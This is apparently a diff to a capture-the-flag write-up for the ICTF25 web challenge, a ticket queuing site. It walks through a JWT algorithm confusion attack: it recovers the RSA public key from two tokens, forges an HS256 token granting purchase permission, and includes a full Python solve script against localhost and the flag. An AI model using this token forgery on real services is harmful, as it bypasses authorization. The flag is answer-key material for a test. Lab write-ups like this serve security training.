@@ -33,6 +33,8 @@ Access to `http://docker-ip-address:3000`
 ## Solution
 <details>
 
+<br>
+
 Since the web exploitation is a black box challenge, source code are not provided and it is required for the players to perform analysis themself and figure out the possible vulnerability. Accessing to the website, a webpage will be displayed like this and it should simulate like a ticket queuing system.
 
 <br>
@@ -146,6 +148,111 @@ After deleting the token and refresh the page will generate another new token.
 
 Second Token: `eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdXJjaGFzZVBlcm0iOmZhbHNlLCJleHAiOjE3NDUxNzc2NTcsImlhdCI6MTc0NTE3NDA1N30.GMSDZvtmFlYGT8dcpk04rHWx6PDM-4DAuzzSXtuvRLfp9-IlVxuwe2MsjzjBGIFU9NLrBhxMkruqm2HcNrDHVkz-NUVDKWmLRED0_VJ9FGwIEARkkZqS-dHXA56x0QxGpUVWSq43_1u_qFi8ZczYAr_O9iXEDmTnBFl2Xu_zLZ0OYOlhKSEnCiGbWUlju2UH-nflysT_I7ENrUTFp_wixpPNYVxfZWLk16ixarISbOixvMdL5rYbYZmPEwos5Lz0-ix4gxmPcY1J2luLRhhQPdkaqKBwMzpSQjwex6N63gHt7kGk_kVfHr1B0L-CIYPazNBn9W5qQcUUVTbvVbzBlg`
 
-Now we have two tokens ready and we can use the tool after successful installation. 
+Now we have two tokens ready and we can use the tool after successful installation. The command should be like this `python3 jwt_forgery.py token1 token2`. When the process is completed, it should display the result like the image below.
 
+<br>
+
+![image](https://github.com/user-attachments/assets/c35c26da-238a-402d-aa1a-3f6aa07e5d4f)
+
+<br>
+
+Now we need to get the public keys from the result. The public keys will usually stored in x509.pem format and we can use `cat` command to obtain the contents of the file. We need to copy the following public keys into a newly created file called `public.pem` which will be used for later on.
+
+![image](https://github.com/user-attachments/assets/55931d70-3c22-4b42-b023-11062acd7241)
+
+<br>
+
+Getting the public key is a crucial step for the JWT Algorithm Confusion attack to work. Now we can forge our own token by creating a simple python script. Firstly we need to read the `public.pem` file and strip unwanted contents before using it as the HMAC secret.
+
+```python
+with open(os.path.join(os.path.dirname(__file__), 'public.pem'), 'r') as f:
+    public_key = f.read()
+
+filter = (
+    public_key
+    .replace('-----BEGIN PUBLIC KEY-----', '')
+    .replace('-----END PUBLIC KEY-----', '')
+    .replace('\n', '')
+    .strip()
+)
+
+hmac_secret = base64.b64decode(filter)
+```
+
+Then, we need to modify the algorithm to HS256 like `{"typ" : "JWT", "alg" : "HS256"}` and changing the payload data to `{"purchasePerm" : True}`. Now, we can forge the token containing HS256 algorithm along with public key as the HMAC secret.
+
+```python
+payload = {"purchasePerm": True}
+headers = {"typ": "JWT","alg": "HS256"}
+
+forged_token = jwt.encode(payload, hmac_secret, algorithm='HS256', headers=headers)
+
+if isinstance(forged_token, bytes):
+    forged_token = forged_token.decode()
+
+print("Forged Token:", forged_token)
+```
+
+Finally, we can send the token to the website using `Authorization: Bearer` to `/buyTicket` endpoint.
+
+```python
+response = requests.get("http://localhost:3000/buyTicket",headers={"Authorization": f"Bearer {forged_token}"})
+
+for line in response.iter_lines(decode_unicode=True):
+    if 'ICTF25{' in line:
+        print(f'Flag:{line}')
+```
+
+#### Full Solve Script (Python)
+
+```python
+import jwt
+import requests
+import base64
+import os
+
+with open(os.path.join(os.path.dirname(__file__), 'public.pem'), 'r') as f:
+    public_key = f.read()
+
+filter = (
+    public_key
+    .replace('-----BEGIN PUBLIC KEY-----', '')
+    .replace('-----END PUBLIC KEY-----', '')
+    .replace('\n', '')
+    .strip()
+)
+
+hmac_secret = base64.b64decode(filter)
+
+payload = {"purchasePerm": True}
+headers = {"typ": "JWT","alg": "HS256"}
+
+forged_token = jwt.encode(payload, hmac_secret, algorithm='HS256', headers=headers)
+
+if isinstance(forged_token, bytes):
+    forged_token = forged_token.decode()
+
+print("Forged Token:", forged_token)
+
+response = requests.get("http://localhost:3000/buyTicket",headers={"Authorization": f"Bearer {forged_token}"})
+
+for line in response.iter_lines(decode_unicode=True):
+    if 'ICTF25{' in line:
+        print(f'Flag:{line}')
+```
+
+After executing the script we are able to obtain the flag which indicates that the JWT Algorithm Confusion attack has been successfully demonstrated. 
+
+<br>
+
+![image](https://github.com/user-attachments/assets/2903c906-3926-428e-84f7-0a481c735758)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/e138a6eb-5794-4cdc-8500-7bf19dd4a7db)
+
+<br>
+
+### Flag
+>ICTF25{3678087349b1b6d839e019a16d5483621af5b09c7d36fc6df346edd4425e7802}
 </details>
